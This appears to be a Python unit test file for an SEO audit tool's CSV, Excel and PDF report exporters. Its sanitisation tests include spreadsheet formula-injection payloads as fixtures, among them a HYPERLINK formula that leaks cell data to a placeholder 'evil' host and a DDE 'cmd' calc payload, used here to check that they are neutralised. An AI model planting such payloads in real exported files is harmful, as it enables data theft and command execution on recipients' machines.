"""Unit tests for modules/report_generator.py: CSV/Excel/PDF export builders.

Focus: the Technical Audit Checklist (35-check breakdown, see
modules/technical_audit_checklist.py) must be surfaced in every export format,
not just the raw JSON dump. These tests exercise flatten() directly and check
generated CSV/Excel/PDF bytes for the checklist data, using openpyxl to read
back the xlsx sheets rather than asserting on raw bytes.
"""

import csv
import io

import openpyxl

from modules.report_generator import _sanitize_cell, flatten, generate_csv, generate_excel, generate_pdf


def _result_with_checklist(**overrides):
    result = {
        "url": "https://example.com/",
        "audit_type": "single",
        "status_code": 200,
        "seo_score": 82,
        "response_time": 0.25,
        "all_issues": [
            {"issue": "Missing alt text", "category": "Images", "severity": "High",
             "recommendation": "Add alt text"},
        ],
        "technical_audit_checklist": {
            "groups": {"crawlability": [], "on_page": [], "site_health": []},
            "checks": [
                {"id": "title_check", "label": "Title tag present & well-sized",
                 "group": "on_page", "status": "pass", "detail": "45 chars"},
                {"id": "robots_check", "label": "robots.txt allows crawling",
                 "group": "crawlability", "status": "fail", "detail": "Blocked by robots.txt"},
                {"id": "spf_check", "label": "SPF record configured",
                 "group": "site_health", "status": "warning", "detail": "Missing"},
            ],
            "summary": {"total": 35, "pass": 28, "warning": 5, "fail": 2},
        },
    }
    result.update(overrides)
    return result


def _result_without_checklist(**overrides):
    result = {
        "url": "https://example.org/",
        "audit_type": "single",
        "status_code": 200,
        "seo_score": 60,
        "response_time": 0.4,
        "all_issues": [],
    }
    result.update(overrides)
    return result


def test_flatten_includes_checklist_summary_columns():
    row = flatten(_result_with_checklist())
    assert row["Checklist Passed"] == 28
    assert row["Checklist Warnings"] == 5
    assert row["Checklist Failed"] == 2


def test_flatten_defaults_checklist_columns_when_missing():
    row = flatten(_result_without_checklist())
    assert row["Checklist Passed"] == ""
    assert row["Checklist Warnings"] == ""
    assert row["Checklist Failed"] == ""


def test_flatten_handles_checklist_key_present_but_none():
    row = flatten(_result_without_checklist(technical_audit_checklist=None))
    assert row["Checklist Passed"] == ""


def test_generate_csv_includes_checklist_columns():
    data = generate_csv([_result_with_checklist(), _result_without_checklist()])
    reader = csv.DictReader(io.StringIO(data.decode("utf-8")))
    rows = list(reader)
    assert "Checklist Passed" in reader.fieldnames
    assert rows[0]["Checklist Passed"] == "28"
    assert rows[1]["Checklist Passed"] == ""


def test_generate_excel_adds_technical_checklist_sheet():
    data = generate_excel([_result_with_checklist()])
    wb = openpyxl.load_workbook(io.BytesIO(data))
    assert "Technical Checklist" in wb.sheetnames
    ws = wb["Technical Checklist"]
    header = [c.value for c in next(ws.iter_rows(min_row=1, max_row=1))]
    assert header == ["URL", "Group", "Check", "Status", "Detail"]
    first_data_row = [c.value for c in next(ws.iter_rows(min_row=2, max_row=2))]
    assert first_data_row[0] == "https://example.com/"
    assert first_data_row[3] == "Pass"


def test_generate_excel_omits_checklist_sheet_when_no_checklist_data():
    data = generate_excel([_result_without_checklist()])
    wb = openpyxl.load_workbook(io.BytesIO(data))
    assert "Technical Checklist" not in wb.sheetnames


def test_generate_pdf_returns_nonempty_bytes_with_and_without_checklist():
    data = generate_pdf([_result_with_checklist(), _result_without_checklist()])
    assert isinstance(data, bytes)
    assert len(data) > 0


def test_sanitize_cell_neutralizes_formula_trigger_chars():
    # A page-controlled title/anchor-text/etc. starting with one of these
    # would otherwise be interpreted as a formula by Excel/Sheets on open.
    for trigger in ("=", "+", "-", "@"):
        malicious = f'{trigger}HYPERLINK("http://evil/?"&A1,"x")'
        assert _sanitize_cell(malicious) == f"'{malicious}"


def test_sanitize_cell_leaves_normal_values_untouched():
    assert _sanitize_cell("Normal Page Title") == "Normal Page Title"
    assert _sanitize_cell(42) == 42
    assert _sanitize_cell(True) is True
    assert _sanitize_cell("") == ""


def test_flatten_sanitizes_formula_injection_in_title():
    result = _result_with_checklist()
    result["metadata"] = {"title": '=cmd|"/c calc"!A1', "title_length": 15}
    row = flatten(result)
    assert row["Meta Title"] == '\'=cmd|"/c calc"!A1'


def test_generate_csv_sanitizes_malicious_issue_text():
    result = _result_with_checklist()
    result["all_issues"] = [
        {"issue": "=SUM(1+1)", "category": "Meta", "severity": "High", "recommendation": "n/a"},
    ]
    data = generate_csv([result])
    reader = csv.DictReader(io.StringIO(data.decode("utf-8")))
    # Total Issues column reflects the count; the malicious title itself only
    # flows into the "All Issues" Excel sheet, not the CSV summary row, so
    # assert on the Excel path below for the actual sanitized issue text.
    rows = list(reader)
    assert rows[0]["Total Issues"] == "1"

    xlsx = generate_excel([result])
    wb = openpyxl.load_workbook(io.BytesIO(xlsx))
    ws = wb["All Issues"]
    header = [c.value for c in next(ws.iter_rows(min_row=1, max_row=1))]
    issue_col = header.index("Issue")
    first_row = [c.value for c in next(ws.iter_rows(min_row=2, max_row=2))]
    assert first_row[issue_col] == "'=SUM(1+1)"
